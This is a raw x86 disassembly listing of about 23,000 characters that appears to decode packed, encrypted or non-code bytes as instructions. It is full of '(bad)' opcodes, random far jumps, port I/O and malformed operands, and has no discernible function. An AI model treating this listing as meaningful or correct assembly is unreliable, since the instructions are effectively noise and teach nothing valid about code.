  41ffb5:	outs   dx,DWORD PTR ds:[esi]
  41ffb6:	or     al,0x5
  41ffb9:	aaa    
  41ffba:	xor    eax,0x60ae19d6
  41ffbf:	cmp    cl,BYTE PTR [esi]
  41ffc1:	adc    al,BYTE PTR [edi]
  41ffc3:	addr16 inc edx
  41ffc5:	or     al,BYTE PTR [ebx-0x63]
  41ffc8:	retf   0x332
  41ffcb:	adc    BYTE PTR [eax+esi*8+0x37],dl
  41ffcf:	cmp    ecx,esi
  41ffd1:	inc    edx
  41ffd2:	sbb    BYTE PTR [ebp+0x1a319e38],0x1f
  41ffd9:	gs xchg esi,eax
  41ffdb:	adc    eax,0xdd454a46
  41ffe0:	int3   
  41ffe1:	pop    ebp
  41ffe2:	in     al,0x15
  41ffe4:	jmp    0x857a49c8
  41ffe9:	jge    0x41ffca
  41ffeb:	sbb    ebx,DWORD PTR [ebp-0x2452b385]
  41fff1:	sub    DWORD PTR [ebp+0x32e044],ebx
  41fff7:	push   esp
  41fff8:	hlt    
  41fff9:	jbe    0x420019
  41fffb:	(bad)  
  41fffc:	push   edi
  41fffd:	adc    bl,ch
  41ffff:	sbb    ebx,DWORD PTR [ebx-0xe]
  420002:	mov    bh,0xa6
  420004:	out    0x62,al
  420006:	xchg   esp,eax
  420007:	adc    BYTE PTR [ebx],dh
  420009:	and    ebp,DWORD PTR [edi+0x29]
  42000c:	and    eax,0x3d66cc1f
  420011:	iret   
  420012:	push   ebx
  420013:	js     0x41ffd3
  420015:	push   edx
  420016:	outs   dx,BYTE PTR ds:[esi]
  420017:	adc    BYTE PTR [esp+ebp*1-0x3b],ah
  42001b:	or     BYTE PTR [ecx+0x6c],0x4a
  42001f:	push   ebx
  420020:	mov    esi,ss
  420022:	dec    esp
  420023:	shr    WORD PTR [ebx+edx*1-0xc],0x1e
  420029:	mov    ds:0xba6ed34c,eax
  42002e:	or     ebx,ecx
  420030:	pop    esi
  420031:	sub    DWORD PTR [esi],eax
  420033:	repz scas eax,DWORD PTR es:[edi]
  420035:	sub    al,0xa9
  420037:	lods   eax,DWORD PTR ds:[esi]
  420038:	call   0x6c29:0x8bf20f5d
  42003f:	sahf   
  420040:	adc    cl,bh
  420042:	out    dx,eax
  420043:	mov    al,ds:0x83d19d7e
  420048:	push   cs
  420049:	mov    ds,ebx
  42004b:	daa    
  42004c:	push   ecx
  42004d:	sbb    bh,BYTE PTR [ebp-0x44af2ede]
  420053:	frstor [ebp+0x32b4b2cd]
  420059:	iret   
  42005a:	mov    bh,0xcc
  42005c:	xor    DWORD PTR [esi+0x1c],ebx
  42005f:	jp     0x42004f
  420061:	scas   al,BYTE PTR es:[edi]
  420062:	push   esp
  420063:	push   eax
  420064:	icebp  
  420065:	adc    esi,DWORD PTR [ecx-0x6e1e7733]
  42006b:	ss out 0x41,eax
  42006e:	push   esi
  42006f:	out    dx,eax
  420070:	into   
  420071:	fbld   TBYTE PTR [esi-0x27c441ba]
  420077:	fistp  QWORD PTR [esi+0x1c183764]
  42007d:	ins    BYTE PTR es:[edi],dx
  42007e:	push   0x7d
  420080:	(bad)  
  420081:	scas   eax,DWORD PTR es:[edi]
  420082:	fisttp DWORD PTR [ecx+ecx*4-0x12]
  420086:	sub    DWORD PTR [esi-0x2f],0xc9ba6889
  42008d:	fld    st(0)
  42008f:	add    al,0x98
  420091:	dec    ecx
  420092:	mov    eax,DWORD PTR [edx+0x5c3b19bf]
  420098:	into   
  420099:	and    BYTE PTR [esi],ch
  42009b:	pusha  
  42009c:	push   ecx
  42009d:	xchg   esp,eax
  42009e:	mov    ah,0xcc
  4200a0:	popa   
  4200a1:	sahf   
  4200a2:	daa    
  4200a3:	jle    0x42007b
  4200a5:	xor    al,BYTE PTR [edi-0x3bbf753e]
  4200ab:	add    ch,BYTE PTR [ebx+0x77]
  4200ae:	sbb    BYTE PTR ds:0xf1a3564f,0xc0
  4200b5:	ds ins BYTE PTR es:[edi],dx
  4200b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200b8:	sbb    bh,BYTE PTR [ebx+0x37]
  4200bb:	imul   edx,eax,0x47
  4200be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200bf:	call   0x924a:0x45b82ea6
  4200c6:	aad    0x94
  4200c8:	addr16 adc eax,0xa91bbbf7
  4200ce:	fimul  DWORD PTR [edx]
  4200d0:	xor    ecx,DWORD PTR [edx+eiz*2]
  4200d3:	jp     0x42006a
  4200d5:	jne    0x42009b
  4200d7:	in     al,dx
  4200d8:	outs   dx,DWORD PTR ds:[esi]
  4200d9:	test   eax,0x27a33114
  4200de:	pop    ecx
  4200df:	cwde   
  4200e0:	mov    dl,bl
  4200e2:	cmp    ah,0x31
  4200e5:	outs   dx,BYTE PTR ds:[esi]
  4200e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200e7:	cli    
  4200e8:	outs   dx,BYTE PTR ds:[esi]
  4200e9:	cmp    DWORD PTR [eax+edi*2],edi
  4200ec:	das    
  4200ed:	sub    bh,BYTE PTR [ecx+esi*8+0x4c024b52]
  4200f4:	sar    DWORD PTR [edi-0x4e],0x30
  4200f8:	mov    DWORD PTR [edx+0x11],eax
  4200fb:	addr16 in eax,0x6f
  4200fe:	je     0x4200fc
  420100:	clc    
  420101:	loop   0x42017d
  420103:	stc    
  420104:	sbb    DWORD PTR [ecx-0x64],eax
  420107:	fsub   QWORD PTR [ebp-0x72]
  42010a:	and    al,0x5f
  42010c:	push   esi
  42010d:	cmp    al,0xd2
  42010f:	sahf   
  420110:	ret    0x56d7
  420113:	push   es
  420114:	push   eax
  420115:	pop    es
  420116:	push   ss
  420117:	mov    bl,0x81
  420119:	cmp    edx,DWORD PTR [edx+0x92c983d]
  42011f:	mov    eax,ds:0x49973fe5
  420124:	in     eax,dx
  420125:	pop    ebx
  420126:	cmp    al,0x5b
  420128:	sbb    edx,DWORD PTR [ebp+0xf933c6]
  42012e:	mov    cs,esp
  420130:	mov    bh,0xf3
  420132:	ret    
  420133:	adc    dh,cl
  420135:	inc    ebp
  420136:	adc    al,0xfc
  420138:	inc    esi
  420139:	ins    BYTE PTR es:[edi],dx
  42013a:	out    dx,eax
  42013b:	add    DWORD PTR [esi+edi*4+0x5b3f7c58],esp
  420142:	add    DWORD PTR [ecx+0xc],edi
  420145:	ror    BYTE PTR [ebx],0xd
  420148:	sbb    BYTE PTR [ebp+0x9f86355],dl
  42014e:	adc    ah,BYTE PTR [ecx+edi*1]
  420151:	and    ah,ch
  420153:	(bad)  
  420154:	stos   BYTE PTR es:[edi],al
  420155:	inc    esp
  420156:	inc    ebx
  420157:	fidivr WORD PTR [ebp-0x7fa99954]
  42015d:	pop    ebp
  42015e:	or     BYTE PTR [ecx-0x3],bl
  420161:	outs   dx,DWORD PTR ds:[esi]
  420162:	ins    DWORD PTR es:[edi],dx
  420163:	loop   0x42012c
  420165:	scas   al,BYTE PTR es:[edi]
  420166:	retf   
  420167:	dec    DWORD PTR [ebp+0x114650b3]
  42016d:	fsin   
  42016f:	cmp    esi,DWORD PTR [ebx-0x7ea740d5]
  420175:	lods   al,BYTE PTR ds:[esi]
  420176:	pushf  
  420177:	out    dx,eax
  420178:	or     edx,DWORD PTR [esi]
  42017a:	mov    bl,0x13
  42017c:	xchg   ebp,eax
  42017d:	loope  0x42017e
  42017f:	mov    esi,DWORD PTR [ebx-0x66]
  420182:	dec    eax
  420183:	sbb    DWORD PTR [eax],eax
  420185:	sbb    al,0xfc
  420187:	mov    ebx,esi
  420189:	jbe    0x420209
  42018b:	mov    dl,0xd9
  42018d:	cmc    
  42018e:	push   di
  420190:	popf   
  420191:	arpl   WORD PTR [esi+0x31bde2f6],di
  420197:	retf   
  420198:	out    dx,eax
  420199:	sbb    eax,esi
  42019b:	pop    ebx
  42019c:	inc    edi
  42019d:	cmp    eax,0x43fe1e7a
  4201a2:	mov    esp,0x35dd74f6
  4201a7:	mov    dl,0x22
  4201a9:	mov    edi,edx
  4201ab:	pop    esi
  4201ac:	lea    edi,[edi]
  4201ae:	sub    ch,BYTE PTR [edx+ebx*1]
  4201b1:	icebp  
  4201b2:	sub    BYTE PTR [edx+0x44],0x97
  4201b6:	scas   al,BYTE PTR es:[edi]
  4201b7:	jb     0x420154
  4201b9:	(bad)  
  4201ba:	fcmovu st,st(6)
  4201bc:	push   0x8b7ffe77
  4201c1:	xchg   ebx,eax
  4201c2:	mov    al,0x1e
  4201c4:	lods   eax,DWORD PTR ds:[esi]
  4201c5:	mov    BYTE PTR [ecx],dh
  4201c7:	mul    BYTE PTR [edx]
  4201c9:	mov    ch,0x60
  4201cb:	add    BYTE PTR [ebp+0x3bd2d52],bh
  4201d1:	add    edi,DWORD PTR [esi+0x17daaeaf]
  4201d7:	pop    esp
  4201d8:	mov    dl,0x4f
  4201da:	nop
  4201db:	push   eax
  4201dc:	outs   dx,DWORD PTR ds:[esi]
  4201dd:	mov    edx,0x607a6691
  4201e2:	loop   0x4201e2
  4201e4:	pop    ebx
  4201e5:	sub    esi,DWORD PTR [edi]
  4201e7:	xor    al,0xd
  4201e9:	dec    ebx
  4201ea:	sub    esi,DWORD PTR [edi]
  4201ec:	xchg   esp,eax
  4201ed:	sbb    BYTE PTR [ecx],ah
  4201ef:	sbb    ch,BYTE PTR [eax-0x7589791]
  4201f5:	sahf   
  4201f6:	cmp    al,0xb0
  4201f8:	adc    BYTE PTR [ecx+0x13918e0],ah
  4201fe:	push   esi
  4201ff:	data16 std 
  420201:	mov    dh,0xa2
  420203:	and    BYTE PTR [eax+0x42],bh
  420206:	pushf  
  420207:	adc    DWORD PTR [edx-0x77bbb6ce],ecx
  42020d:	jno    0x420233
  42020f:	fs popf 
  420211:	mov    ch,0xe7
  420213:	pop    edx
  420214:	mov    eax,ds:0x9799030c
  420219:	mov    esi,0x39d01cb6
  42021e:	ds push edx
  420220:	jp     0x42027a
  420222:	sub    ebx,DWORD PTR [edx-0x11]
  420225:	into   
  420226:	stos   BYTE PTR es:[edi],al
  420227:	cmc    
  420228:	pushf  
  420229:	popa   
  42022a:	xchg   ebp,eax
  42022b:	jmp    0x329ebca4
  420230:	in     eax,dx
  420231:	inc    ebx
  420232:	xor    al,0xc4
  420234:	(bad)  
  420235:	iret   
  420236:	cli    
  420237:	cdq    
  420238:	mov    bh,0xc9
  42023a:	push   ebx
  42023b:	dec    ebp
  42023c:	out    0xac,eax
  42023e:	(bad)  
  42023f:	or     DWORD PTR [ebx+0x53],0x6183ca36
  420246:	xor    al,0xdc
  420248:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420249:	enter  0x5d79,0xa
  42024d:	sbb    al,0xbb
  42024f:	xchg   DWORD PTR [ebx+0x11],edi
  420252:	sub    eax,0x91c6ea1d
  420257:	les    ebp,FWORD PTR [eax-0x56]
  42025a:	adc    eax,0x36c6d338
  42025f:	lods   al,BYTE PTR ds:[esi]
  420260:	push   cs
  420261:	inc    ecx
  420262:	jmp    0x420281
  420264:	and    ch,ah
  420266:	fwait
  420267:	out    0x67,eax
  420269:	sbb    eax,0xbcb0cc03
  42026e:	ss jne 0x42026a
  420271:	daa    
  420272:	dec    esp
  420273:	inc    edi
  420274:	dec    ebp
  420275:	inc    esp
  420276:	in     eax,dx
  420277:	sub    DWORD PTR [esi+eiz*4],edi
  42027a:	lods   al,BYTE PTR ds:[esi]
  42027b:	pop    esi
  42027c:	mov    al,ds:0xe5301297
  420281:	mov    dl,0x29
  420283:	imul   edi,DWORD PTR [edi+0xa],0x36
  420287:	sar    BYTE PTR [bp+0x623],cl
  42028c:	or     eax,0x1af4e635
  420291:	fld    QWORD PTR [ecx-0x39]
  420294:	sbb    BYTE PTR [edx-0x7191c942],bh
  42029a:	cmp    DWORD PTR [edx],eax
  42029c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42029d:	js     0x42024f
  42029f:	cwde   
  4202a0:	push   ss
  4202a1:	in     eax,dx
  4202a2:	retf   
  4202a3:	outs   dx,BYTE PTR ds:[esi]
  4202a4:	add    al,0x8c
  4202a6:	lahf   
  4202a7:	inc    edx
  4202a8:	push   edi
  4202a9:	or     edx,ecx
  4202ab:	jno    0x4202c6
  4202ad:	mov    esi,DWORD PTR [eax]
  4202af:	inc    eax
  4202b0:	inc    edi
  4202b1:	inc    edx
  4202b2:	and    al,0xc1
  4202b4:	inc    esi
  4202b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202b6:	sub    eax,0x753537c6
  4202bb:	neg    esi
  4202bd:	add    esp,DWORD PTR [ebx-0x4684ddf5]
  4202c3:	jmp    0xcca3:0x9fb5be80
  4202ca:	dec    ebx
  4202cb:	aas    
  4202cc:	xchg   ebx,eax
  4202cd:	dec    esi
  4202ce:	arpl   WORD PTR [ebx+0x60bb6b17],si
  4202d4:	adc    esp,esi
  4202d6:	push   eax
  4202d7:	stos   BYTE PTR es:[edi],al
  4202d8:	hlt    
  4202d9:	adc    eax,0x6094a70f
  4202de:	cmp    ecx,ebx
  4202e0:	add    ah,BYTE PTR [edx-0x5c]
  4202e3:	xor    BYTE PTR [esi-0x7f],dh
  4202e6:	hlt    
  4202e7:	dec    ecx
  4202e8:	dec    ebx
  4202e9:	mov    ?,WORD PTR [edx+0x48]
  4202ec:	fist   WORD PTR [ecx+0x669872a5]
  4202f2:	mov    bl,0xc
  4202f4:	cli    
  4202f5:	cmc    
  4202f6:	(bad)  
  4202f7:	mov    cl,0xc6
  4202f9:	sbb    BYTE PTR [esi+0x581ba6e6],dh
  4202ff:	gs mov edx,0xb33ec16
  420305:	js     0x420298
  420307:	add    edx,DWORD PTR [edx]
  420309:	inc    esi
  42030a:	mov    eax,0xb481f55
  42030f:	push   ds
  420310:	dec    ecx
  420311:	(bad)  
  420312:	fisubr WORD PTR [ecx]
  420314:	add    cl,ch
  420316:	mov    esp,0x80716f86
  42031b:	mov    ds:0x98908a3c,al
  420320:	lea    edi,[eax]
  420322:	leave  
  420323:	jns    0x4202ff
  420325:	sbb    edx,DWORD PTR [esi+0x4b]
  420328:	neg    DWORD PTR [ebp-0x3e8e9ac4]
  42032e:	hlt    
  42032f:	xor    ecx,DWORD PTR [edx]
  420331:	mov    ebx,0xf666dae2
  420336:	xchg   DWORD PTR [edx],edi
  420338:	call   0xd9081d9e
  42033d:	jle    0xcd4d5677
  420343:	inc    ebx
  420344:	cwde   
  420345:	add    ch,BYTE PTR [ecx+esi*8-0x1a]
  420349:	das    
  42034a:	add    BYTE PTR [ecx],0x83
  42034d:	or     al,0xf3
  42034f:	sbb    eax,0x521f67cf
  420354:	andps  xmm3,XMMWORD PTR [edi-0x657ee87a]
  42035b:	cmp    DWORD PTR [edi-0x37],eax
  42035e:	and    DWORD PTR [ecx-0x2fea2b90],0x47bbe6aa
  420368:	out    dx,al
  420369:	add    bh,BYTE PTR [ecx+eax*4-0x1a890fbe]
  420370:	inc    ebx
  420371:	icebp  
  420372:	jae    0x4203ce
  420374:	in     al,dx
  420375:	xchg   esi,eax
  420376:	ja     0x4203d9
  420378:	cli    
  420379:	cmp    al,0xdb
  42037b:	sub    BYTE PTR [ebx-0x2a],dh
  42037e:	jmp    0x42039f
  420380:	mov    gs,WORD PTR [esi-0x60]
  420383:	adc    al,0x9f
  420385:	or     BYTE PTR [ecx+0x3bd4ea8b],ah
  42038b:	fidiv  WORD PTR [eax+eax*8]
  42038e:	fdivr  QWORD PTR [ebx+0x16]
  420391:	lods   al,BYTE PTR ds:[esi]
  420392:	xlat   BYTE PTR ds:[ebx]
  420393:	jmp    0xe949:0xc0c38ee9
  42039a:	int    0x86
  42039c:	jmp    0x37da:0xfcc60325
  4203a3:	ss retf 0xefd6
  4203a7:	(bad)  
  4203a8:	cmp    dh,BYTE PTR [ebp+0x7f338279]
  4203ae:	and    esi,0x44
  4203b1:	xchg   ebx,eax
  4203b2:	push   ecx
  4203b3:	jno    0x42039d
  4203b5:	jb     0x420417
  4203b7:	aad    0x15
  4203b9:	out    dx,eax
  4203ba:	icebp  
  4203bb:	inc    esp
  4203bc:	in     al,0x86
  4203be:	dec    BYTE PTR [edi]
  4203c0:	pop    edi
  4203c1:	inc    edx
  4203c2:	fiadd  DWORD PTR [ebx+ebp*4-0x7c]
  4203c6:	cmp    eax,0xb2f45043
  4203cb:	jns    0x42043a
  4203cd:	enter  0x1514,0x97
  4203d1:	lods   al,BYTE PTR ds:[esi]
  4203d2:	dec    ecx
  4203d3:	adc    dh,BYTE PTR [esi+0x5e]
  4203d6:	pop    esi
  4203d7:	aad    0x67
  4203d9:	sbb    DWORD PTR [edi+0x1e1ad1e1],eax
  4203df:	or     eax,0xff758a5b
  4203e4:	retf   0xccbc
  4203e7:	xchg   edx,eax
  4203e8:	in     eax,0xf4
  4203ea:	xchg   edx,eax
  4203eb:	out    dx,al
  4203ec:	sbb    BYTE PTR [esi-0x2b3d0f0f],ch
  4203f2:	xchg   esi,eax
  4203f3:	xchg   esi,eax
  4203f4:	fbstp  TBYTE PTR [ecx-0x73]
  4203f7:	stc    
  4203f8:	icebp  
  4203f9:	pop    ebp
  4203fa:	imul   esp,DWORD PTR [edi+0x7c],0x3225ef24
  420401:	dec    BYTE PTR [edx]
  420403:	test   bl,bl
  420405:	popf   
  420406:	jmp    0x11c4:0xf85be1b
  42040d:	shr    dh,0x6d
  420410:	or     esi,DWORD PTR [ecx]
  420412:	inc    eax
  420413:	gs inc ebx
  420415:	mov    ebx,0x7633d748
  42041a:	mov    edi,0x3f6c9d18
  42041f:	jl     0x420463
  420421:	cwde   
  420422:	les    eax,FWORD PTR [edi-0x63]
  420425:	push   ss
  420426:	sbb    DWORD PTR [ecx+0x19],0x5b
  42042a:	arpl   ax,ax
  42042c:	fs out 0x2b,al
  42042f:	(bad)  
  420430:	mov    eax,0x4e19ee83
  420435:	lods   eax,DWORD PTR ds:[esi]
  420436:	out    dx,al
  420437:	inc    ebx
  420438:	inc    esp
  420439:	inc    ebx
  42043a:	and    ch,dl
  42043c:	dec    eax
  42043d:	jmp    0xa76f:0xe21d7d7c
  420444:	sub    al,0x67
  420446:	xor    eax,0x36601586
  42044b:	xor    edx,DWORD PTR [ebx+0x6a]
  42044e:	aad    0x39
  420450:	inc    eax
  420451:	pop    esi
  420452:	call   0xfd6:0x40f6c6b9
  420459:	jno    0x4204b5
  42045b:	xchg   ebx,eax
  42045c:	repz sbb BYTE PTR ds:0x4fe19d42,ah
  420463:	out    0x52,al
  420465:	cmc    
  420466:	loope  0x4204af
  420468:	add    DWORD PTR [eax+0x3b],edi
  42046b:	push   edi
  42046c:	jmp    0x66b5:0x4b4078fb
  420473:	push   edi
  420474:	jns    0x4204e4
  420476:	std    
  420477:	into   
  420478:	jecxz  0x4204be
  42047a:	jns    0x42049a
  42047c:	push   eax
  42047d:	xor    ch,BYTE PTR [eax+0x13]
  420480:	ss ins BYTE PTR es:[edi],dx
  420482:	xchg   ebp,eax
  420483:	in     eax,0xb6
  420485:	outs   dx,DWORD PTR ds:[esi]
  420486:	into   
  420487:	xchg   esi,eax
  420488:	test   DWORD PTR [ebx+0x792d55a9],esp
  42048e:	fnstsw WORD PTR [edx+0x4a]
  420491:	mov    dh,0xed
  420493:	mov    cl,bl
  420495:	jle    0x42048d
  420497:	inc    edx
  420498:	sub    BYTE PTR [ebx],bl
  42049a:	aad    0x5
  42049c:	adc    DWORD PTR [ebp*2+0x4e1923ec],ebp
  4204a3:	mov    cl,0xb7
  4204a5:	adc    ebx,DWORD PTR [ebx-0x4f]
  4204a8:	pop    eax
  4204a9:	jno    0x420526
  4204ab:	aaa    
  4204ac:	rcl    dl,0x1b
  4204af:	(bad)  
  4204b0:	push   ss
  4204b1:	jnp    0x42051f
  4204b3:	dec    ecx
  4204b4:	imul   ebx,DWORD PTR [esp+ecx*4],0x4b
  4204b8:	xchg   eax,esi
  4204ba:	sub    BYTE PTR ds:[eax-0x6ab880d9],0x77
  4204c2:	(bad)  
  4204c3:	cmc    
  4204c4:	xor    esi,DWORD PTR [edi+0x5a]
  4204c7:	out    dx,eax
  4204c8:	pop    ss
  4204c9:	ret    0xf2c0
  4204cc:	sub    ch,BYTE PTR [esi+0x34]
  4204cf:	stos   BYTE PTR es:[edi],al
  4204d0:	mov    ch,BYTE PTR [edi+ecx*4+0x74]
  4204d4:	mov    dh,0xae
  4204d6:	push   esi
  4204d7:	sbb    eax,0x7f1af13d
  4204dc:	mul    DWORD PTR [eax+0x7801adf9]
  4204e2:	aas    
  4204e3:	mov    eax,0xa7c7a39e
  4204e8:	aas    
  4204e9:	mov    ebx,0xf841ad6d
  4204ee:	dec    edi
  4204ef:	pop    esi
  4204f0:	repz xchg ecx,eax
  4204f2:	lods   eax,DWORD PTR ds:[esi]
  4204f3:	and    eax,0x927b4f8e
  4204f8:	inc    edx
  4204f9:	pop    edi
  4204fa:	sub    al,0xd2
  4204fc:	cmp    cl,dl
  4204fe:	loopne 0x420504
  420500:	xor    BYTE PTR [edx*4+0x51b424e5],bh
  420507:	ins    BYTE PTR es:[edi],dx
  420508:	jno    0x4204f1
  42050a:	xchg   ebx,eax
  42050b:	(bad)  
  42050c:	adc    ah,BYTE PTR [esi-0x4c]
  42050f:	mov    eax,ds:0xd1e4bb33
  420514:	xchg   esp,eax
  420515:	scas   al,BYTE PTR es:[edi]
  420516:	out    dx,eax
  420517:	jle    0x420557
  420519:	int    0x2f
  42051b:	loop   0x42057f
  42051d:	jns    0x42052e
  42051f:	in     al,0x3a
  420521:	cmp    BYTE PTR [ecx-0x5486b9a2],cl
  420527:	je     0x420530
  420529:	mov    edi,DWORD PTR [ecx+0x45ab7b8c]
  42052f:	iret   
  420530:	sbb    dh,BYTE PTR [eax-0x5e]
  420533:	xor    DWORD PTR [ecx+ecx*1],eax
  420536:	sub    dl,cl
  420538:	and    DWORD PTR [bx-0x6cae],ecx
  42053d:	mov    edx,edx
  42053f:	bound  ebp,QWORD PTR [eax+0x4c]
  420542:	out    0x19,al
  420544:	adc    BYTE PTR [eax-0x62],0xda
  420548:	pop    ecx
  420549:	mov    ds:0x411a423f,al
  42054e:	scas   al,BYTE PTR es:[edi]
  42054f:	jno    0x420545
  420551:	scas   al,BYTE PTR es:[edi]
  420552:	cli    
  420553:	call   0x1009:0x62ba1671
  42055a:	inc    edi
  42055b:	or     DWORD PTR [eax],ebp
  42055d:	jmp    0xcf15:0x4e946dc9
  420564:	adc    DWORD PTR [ebx+0x7a],ebp
  420567:	xchg   ecx,eax
  420568:	pushf  
  420569:	dec    ecx
  42056a:	outs   dx,DWORD PTR ds:[esi]
  42056b:	jecxz  0x420537
  42056d:	(bad)  
  42056e:	lds    esp,FWORD PTR [edx]
  420570:	fisubr WORD PTR [ecx]
  420572:	cmc    
  420573:	pop    ebx
  420574:	nop
  420575:	pop    ebx
  420576:	add    DWORD PTR [ebp+0x13],edi
  420579:	rcl    BYTE PTR [edx],0x7d
  42057c:	lea    ecx,[esi]
  42057e:	out    0xc3,eax
  420580:	dec    edi
  420581:	cs call 0xdb6754a3
  420587:	rol    BYTE PTR [esi],0xa7
  42058a:	gs jmp 0x420512
  42058d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42058e:	jp     0x42055c
  420590:	add    esp,DWORD PTR [edx-0x6ff3c838]
  420596:	dec    esp
  420597:	imul   eax,DWORD PTR [ecx+ebp*1-0x62a8a447],0x3246f385
  4205a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205a3:	nop
  4205a4:	xchg   ebp,eax
  4205a5:	dec    eax
  4205a6:	or     al,0x24
  4205a8:	xlat   BYTE PTR ds:[ebx]
  4205a9:	(bad)  
  4205aa:	mov    eax,0xe1dc816a
  4205af:	sbb    BYTE PTR [edx-0x274d880e],bh
  4205b5:	push   ds
  4205b6:	out    0x4,al
  4205b8:	lods   al,BYTE PTR ds:[esi]
  4205b9:	shr    esi,cl
  4205bb:	fwait
  4205bc:	jl     0x42063c
  4205be:	es das 
  4205c0:	pusha  
  4205c1:	enter  0x7ec3,0x3d
  4205c5:	mov    bh,0x81
  4205c7:	add    DWORD PTR [edx-0x3d],edi
  4205ca:	ret    
  4205cb:	mov    esi,DWORD PTR [ebx-0x70]
  4205ce:	enter  0x98cb,0xb4
  4205d2:	(bad)  
  4205d3:	mov    bl,0x29
  4205d5:	cwde   
  4205d6:	inc    eax
  4205d7:	fwait
  4205d8:	(bad)  
  4205d9:	mov    DWORD PTR [edi+0x4e],esp
  4205dc:	jge    0x4205ca
  4205de:	mov    edx,ecx
  4205e0:	xor    edi,ebx
  4205e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205e3:	bound  edi,QWORD PTR [esi+eiz*4+0x3b2e65b9]
  4205ea:	dec    ecx
  4205eb:	mov    ds:0x334ab7fb,al
  4205f0:	mov    esp,0x22b53009
  4205f5:	mov    edx,?
  4205f7:	lods   al,BYTE PTR ds:[esi]
  4205f8:	and    DWORD PTR [edi-0x5b],ecx
  4205fb:	jg     0x42062b
  4205fd:	cdq    
  4205fe:	and    esp,DWORD PTR [ebp+0x13]
  420601:	scas   eax,DWORD PTR es:[edi]
  420602:	sbb    BYTE PTR [ebp+ebp*2-0x5c],cl
  420606:	mov    cl,0xbe
  420608:	xchg   ecx,eax
  420609:	sbb    dl,0xea
  42060c:	imul   edx,ebx,0xbf9d41f2
  420612:	(bad)
  420615:	adc    eax,0xa094c9af
  42061a:	and    ah,BYTE PTR [eax-0x2b140136]
  420620:	adc    eax,0xe0b606f2
  420625:	inc    esp
  420626:	cmp    DWORD PTR [eax],edi
  420628:	test   DWORD PTR [ecx+0x22],0x3a03cf82
  42062f:	jmp    0x2e453141
  420634:	push   ebx
  420635:	mov    al,0x6
  420637:	pushf  
  420638:	pop    ebx
  420639:	inc    BYTE PTR [ebx]
  42063b:	jg     0x4205d0
  42063d:	xchg   esi,eax
  42063e:	fnstenv [edx+0x2]
  420641:	hlt    
  420642:	std    
  420643:	add    al,0x56
  420645:	adc    al,0xea
  420647:	mov    ch,0xa8
  420649:	repz push es
  42064b:	xor    BYTE PTR [ebx-0x2ea8c8ea],dl
  420651:	or     al,0x89
  420653:	jge    0x4206bf
  420655:	daa    
  420656:	cdq    
  420657:	push   ecx
  420658:	inc    edi
  420659:	or     DWORD PTR [edi],esi
  42065b:	add    bl,0xb8
  42065e:	pusha  
  42065f:	and    ah,BYTE PTR [ebp+0xe08762c]
  420665:	sbb    DWORD PTR [edi+0x25],esi
  420668:	add    DWORD PTR [ebx+0x67],esi
  42066b:	adc    DWORD PTR [esi+eiz*4-0x2b],ebp
  42066f:	inc    ebp
  420670:	cld    
  420671:	mov    ?,WORD PTR [esi-0x70]
  420674:	test   eax,0xc11a2c60
  420679:	fld    DWORD PTR [ecx+0xc565f96]
  42067f:	repnz in al,0xbc
  420682:	xor    BYTE PTR [edi],bh
  420684:	ins    BYTE PTR es:[edi],dx
  420685:	gs je  0x4206e8
  420688:	in     eax,dx
  420689:	je     0x4206e9
  42068b:	mov    BYTE PTR [edx],al
  42068d:	scas   al,BYTE PTR es:[edi]
  42068e:	repnz sti 
  420690:	jecxz  0x42069e
  420692:	mov    eax,0xdaecf558
  420697:	rcr    BYTE PTR [eax],1
  420699:	inc    esi
  42069a:	mov    ah,0xe
  42069c:	add    cl,BYTE PTR [eax+ebx*2]
  42069f:	sbb    DWORD PTR [edx+0x2b12b06b],esi
  4206a5:	push   0xffffffe3
  4206a7:	in     eax,0x78
  4206a9:	push   ecx
  4206aa:	cmp    al,0xb7
  4206ac:	or     BYTE PTR ds:0x799bd109,ah
  4206b2:	mul    bh
  4206b4:	jne    0x420654
  4206b6:	sub    DWORD PTR [esi-0x498b5898],ebx
  4206bc:	push   cs
  4206bd:	xchg   ebx,eax
  4206be:	xchg   ecx,eax
  4206bf:	or     eax,0xa65e64a9
  4206c4:	ret    0x3593
  4206c7:	fcomp  QWORD PTR [ebp-0x5b]
  4206ca:	loop   0x4206d5
  4206cc:	jb     0x420687
  4206ce:	sbb    ecx,edi
  4206d0:	int3   
  4206d1:	sbb    BYTE PTR [ebp+0x66f310a0],dh
  4206d7:	or     edx,DWORD PTR ds:0x5e93560e
  4206dd:	inc    ebp
  4206de:	xchg   ecx,eax
  4206df:	in     al,dx
  4206e0:	or     eax,0xd9e37fde
  4206e5:	mov    al,0x57
  4206e7:	xor    bh,bl
  4206e9:	out    0x5,al
  4206eb:	ins    BYTE PTR es:[edi],dx
  4206ec:	popf   
  4206ed:	lea    esi,[ebx]
  4206ef:	push   es
  4206f0:	rol    BYTE PTR [edi+0x7cbfb76b],cl
  4206f6:	arpl   WORD PTR [eax+edx*8],ax
  4206f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206fa:	xor    al,0xb7
  4206fc:	bound  edi,QWORD PTR [ebx+0xd]
  4206ff:	sbb    bh,bl
  420701:	in     al,0x77
  420703:	data16 mov cl,0x9b
  420706:	sbb    edi,edi
  420708:	push   ebp
  420709:	sub    ecx,DWORD PTR [edx-0x676b4545]
  42070f:	fistp  DWORD PTR [esi+0x573fab5e]
  420715:	and    DWORD PTR [esi+0x354a2394],0xffffff8b
  42071c:	cs stc 
  42071e:	cmc    
  42071f:	cld    
  420720:	ja     0x420787
  420722:	mov    ecx,0x60290759
  420727:	sub    DWORD PTR [edx+0x38],eax
  42072a:	jge    0x4206be
  42072c:	scas   eax,DWORD PTR es:[edi]
  42072d:	loopne 0x420773
  42072f:	jg     0x420755
  420731:	inc    eax
  420732:	or     BYTE PTR [ebx+0x728523d9],cl
  420738:	dec    edi
  420739:	add    bh,cl
  42073b:	mov    esi,DWORD PTR ds:0x88c329dd
  420741:	(bad)  
  420743:	mov    ds:0x62e6b8c,al
  420748:	push   0x828a8b0
